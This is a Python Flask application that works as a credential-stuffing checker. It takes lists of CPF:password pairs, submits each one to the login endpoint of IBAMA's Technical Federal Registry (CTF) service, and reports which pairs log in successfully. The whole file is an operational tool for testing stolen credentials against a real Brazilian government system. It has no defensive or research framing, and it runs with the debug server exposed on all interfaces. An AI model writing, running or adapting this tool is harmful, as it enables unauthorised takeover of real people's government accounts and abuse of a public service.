from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    resultado = None
    if request.method == 'POST':
        combos = request.form['combos']
        combos = combos.strip().splitlines()

        resultado = []
        for combo in combos:
            if ':' in combo:
                cpf, senha = combo.strip().split(':')
                status = check_ibama(cpf.strip(), senha.strip())
                resultado.append(status)
            else:
                resultado.append(f"❌ Formato inválido | {combo}")
    return render_template('index.html', resultado=resultado)

def check_ibama(cpf, senha):
    try:
        session = requests.Session()

        url = 'https://servicos.ibama.gov.br/ctf/index.php'

        payload = {
            'ajax': '2',
            'aplic': 'ctf',
            'login_cpf': cpf,
            'login_senha': senha,
            'formDinAcao': 'autenticar',
            'dataType': 'json',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://servicos.ibama.gov.br/ctf/',
        }

        response = session.post(url, data=payload, headers=headers)

        conteudo = response.text

        if "menu.php" in conteudo or "sair.php" in conteudo:
            return f"✅ Válido | {cpf}:{senha}"
        elif "Usuário ou senha inválidos" in conteudo or "Login inválido" in conteudo:
            return f"❌ Inválido | {cpf}:{senha}"
        else:
            return f"⚠️ Erro ou resposta inesperada | {cpf}:{senha}"

    except Exception as e:
        return f"⚠️ Erro | {cpf}:{senha} | {str(e)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
